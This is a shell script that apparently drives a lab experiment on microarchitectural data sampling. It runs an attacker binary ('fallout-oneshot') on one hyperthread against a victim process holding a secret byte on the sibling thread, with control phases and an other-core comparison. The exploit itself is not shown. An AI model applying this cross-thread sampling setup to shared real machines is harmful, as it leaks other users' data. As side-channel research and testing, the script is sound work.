#!/bin/sh
# D1 cross-context: a victim loop on one SMT thread of a core, the attacker
# (NOSTORE sampling) on the sibling. Siblings on this box: cpu0 and cpu2.
# The attacker never stores a secret; the only 0x42 in the system is the
# victim's. Expectation if cross-thread sampling works: class 61 lights up
# in phase 2 and only there.
# Usage: sh d1-cross.sh > /tmp/d1-cross.txt 2>&1
cd /home/detox/CPU/labs/mds || exit 1

A="env CPU=0 CSEQ=1 NOSTORE=1 NC=1 SLOT=61 FRESH=1 timeout 20"

echo "== topology: cpu0=$(cat /sys/devices/system/cpu/cpu0/topology/thread_siblings_list) cpu2=$(cat /sys/devices/system/cpu/cpu2/topology/thread_siblings_list)"

echo "== phase 1: no victim (control), attacker cpu0 watches class 61"
for i in 1 2 3; do
    $A taskset -c 0 ./fallout-oneshot | grep -E "cseq slot=61 round=|majority_rounds"
done

echo "== phase 2: victim 0x42 on cpu2 (sibling), attacker cpu0"
taskset -c 2 ./mds-victim 0x42 12 &
VP=$!
sleep 1
for i in 1 2 3 4 5 6; do
    $A taskset -c 0 ./fallout-oneshot | grep -E "cseq slot=61 round=|majority_rounds"
    sleep 1
done
echo "-- phase 2b: same victim, attacker WITH its own store (sanity)"
env CPU=0 CSEQ=1 NC=1 SLOT=61 FRESH=1 timeout 20 taskset -c 0 ./fallout-oneshot | grep -E "cseq slot=61 round=|majority_rounds"
kill $VP 2>/dev/null
wait $VP 2>/dev/null

echo "== phase 3: victim 0x43 on cpu2 (different class), attacker watches 61"
taskset -c 2 ./mds-victim 0x43 8 &
VP=$!
sleep 1
for i in 1 2 3; do
    $A taskset -c 0 ./fallout-oneshot | grep -E "cseq slot=61 round=|majority_rounds"
    sleep 1
done
kill $VP 2>/dev/null
wait $VP 2>/dev/null

echo "== phase 4: victim 0x42 on cpu1 (other core), attacker cpu0"
taskset -c 1 ./mds-victim 0x42 8 &
VP=$!
sleep 1
for i in 1 2 3; do
    $A taskset -c 0 ./fallout-oneshot | grep -E "cseq slot=61 round=|majority_rounds"
    sleep 1
done
kill $VP 2>/dev/null
wait $VP 2>/dev/null

echo "== phase 5: no victim again (control)"
for i in 1 2; do
    $A taskset -c 0 ./fallout-oneshot | grep -E "cseq slot=61 round=|majority_rounds"
done
